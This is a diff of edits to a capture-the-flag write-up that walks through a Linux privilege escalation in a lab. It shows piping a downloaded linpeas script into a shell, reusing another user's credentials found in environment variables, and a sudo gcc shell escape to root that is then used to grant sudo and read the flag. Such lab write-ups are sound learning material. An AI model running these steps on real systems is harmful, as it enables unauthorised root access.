@@ -22,10 +22,10 @@ Usual disclaimer here: the following solution was the one that worked and there 
 
 ```bash
 ssh Pentester@<ip>
-ssh: connect to host 10.2.255.120 port 22: Connection refused
+ssh: connect to host <ip> port 22: Connection refused
 ```
 
-Ah, ok why. Let's check what ports are open and services running:
+Ah, ok why tho. Let's check what ports are open and services running:
 
 ```bash
 nmap -sV <ip>
@@ -42,14 +42,14 @@ Nmap done: 1 IP address (1 host up) scanned in 12.95 seconds
  
 ```
 
-Switching ports:
+Switching ports
 
 ```bash
 ssh -p 2222 Pentester@<ip>
 ```
 
 
-Challenge requires privilege escalation so let's go script kiddie and fetch a tool to search for privilege escalations ("privesc" as it's call in "the biz"):
+Challenge requires privilege escalation so let's go script kiddie and fetch a tool to search for that "privesc" as it's call in "the biz":
 
 ```bash
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
@@ -100,7 +100,7 @@ ADVISORY: This script should be used for authorized penetration testing and/or e
 
 ```
 
-... a bunch of other info ... 
+... etc etc ... 
 
 ```bash
 ╔══════════╣ Environment
@@ -110,11 +110,9 @@ LOGNAME=Pentester
 JOAN_TEMPORARY_CREDS=jojocreds1
 ```
  
-Well well well. For reasons mysterious there are temp creds for another user in our environment of our account. 
+Well well well. For reasons mysterious there are temp creds for another user in the environment variables of our account. 
 
-Let's try sshing into their account and see what permissions they have. 
-
-Fingers crossed they're in sudoers and we can use their privilege to escalate ours **sinister laugh**. 
+Let's try SSHing into their account and see what permissions they have. Fingers crossed they're in `sudo` group and we can use their privilege to escalate ours **sinister laugh**. 
 
 What's our target account though? 
 
@@ -149,7 +147,7 @@ Last login: Thu Nov 28 22:51:34 2024 from 127.0.0.1
 
 ### Step 2: Priv Esc
 
-See what groups she's in
+See what groups Joan's in
 
 ```bash
 groups
@@ -163,20 +161,22 @@ sudo usermod -aG sudo Pentester
 Sorry, user Joan is not allowed to execute '/usr/sbin/usermod -aG sudo Pentester' as root on dad5f987a15f."
 ```
 
-Nope. Gah! Rubbing my brow here as I was heading for a PB for unfinished challenges in this event. Thankfully team-work makes the dream work and I looked to the east for a teammate wizard saviour:
+Blerg! Rubbing the brow here as I was heading for a PB for unfinished challenges in this event. Thankfully team-work makes the dream work and I looked to the east for a teammate wizard saviour:
 
 ![image](./gandalf-white.gif)
 
-Lol, thanks wizard teammate 🧙 10 seconds, one command, and a URL later: 
+Thanks wizard teammate 🧙 10 seconds, one command, and a URL later: 
+
+The command: 
 
 ```bash
 sudo -l
 (ALL) NOPASSWD: /usr/bin/gcc
 ```
 
-https://gtfobins.github.io/gtfobins/gcc#sudo
+The URL: https://gtfobins.github.io/gtfobins/gcc#sudo
 
-Doopdeedoop, let's try that command
+Doopdeedoop, let's try that GTOFbin command now
 
 ```bash
 sudo gcc -wrapper /bin/sh,-s .
@@ -184,9 +184,10 @@ sudo gcc -wrapper /bin/sh,-s .
 root
 # 
 ```
+
 😍 
 
-Now we can add our Pentester account to sudoers
+Now we can give our Pentester account sudo powers
 
 ```bash
 sudo usermod -aG sudo Pentester
@@ -194,7 +195,8 @@ exit
 exit
 exit
 ```
-We logged out of root, Joan, and Pentester, then sshed back in and to apply the new group memberships. Check those:
+
+There we logged out of root, Joan, and Pentester, then sshed back in to the latter and to apply the new group memberships. Check those:
 
 ```bash
 ssh -p 2222 Pentester@<ip>
@@ -203,12 +205,15 @@ Pentester sudo
 ```
 
 Huzzah! Now what commands can we run as sudo?
+
 ```bash
 sudo -l
 (ALL) NOPASSWD: /usr/bin/gcc
 ```
 
-Run that GTFOBin again. 
+Interesting this one, as the commands are limited to those Joan had. Wasn't expecting that. 
+
+Run that GTFOBin again with our account.
 
 ```bash
 Pentester@host:~$ sudo gcc -wrapper /bin/sh,-s .
@@ -223,14 +228,14 @@ Privilege escalated.
 
 ### Step 3: Flag Retrieval
 
-Now we are in god mode, the flag's gotta be here somewhere, normally I use `find` (looking for flag.txt) or `grep` (looking for string FLAG within a file) on the entire file system. Trying find first
+Now the flag's gotta be here somewhere, normally I use `find` (looking for flag.txt) or `grep` (looking for string FLAG within a file) on the entire file system. Trying find first:
 
 ```bash
 # find / -name flag.txt -type f
 /root/flag.txt
 ```
 
-Looks promising. 
+Then
 
 ```bash
 # cat /root/flag.txt
@@ -242,10 +247,10 @@ FLAG{7H15_SUDO_C00K3D_R007}
 
 ---
 
-## Notes
+## Reflections
 
-- Don't be afraid to ask for help when you get blocked. Difficult for you can be easy for someone else and vice versa. 
-- As a team, set up some tools in comms (like a thread for each challenge) to share progress and artefacts for challenges so someone can pick up from where you were stuck.
+- Ask teammates for help when you get blocked. Difficult for you can be easy for them and vice versa. 
+- As a team, set up some tools in comms (like a thread for each challenge) to share progress and artefacts for challenges so someone can pick up from where someone else is stuck.
 - Linpeas and gftobins are l337h4x0r was to privesc on linux. 🫶
 
 ---
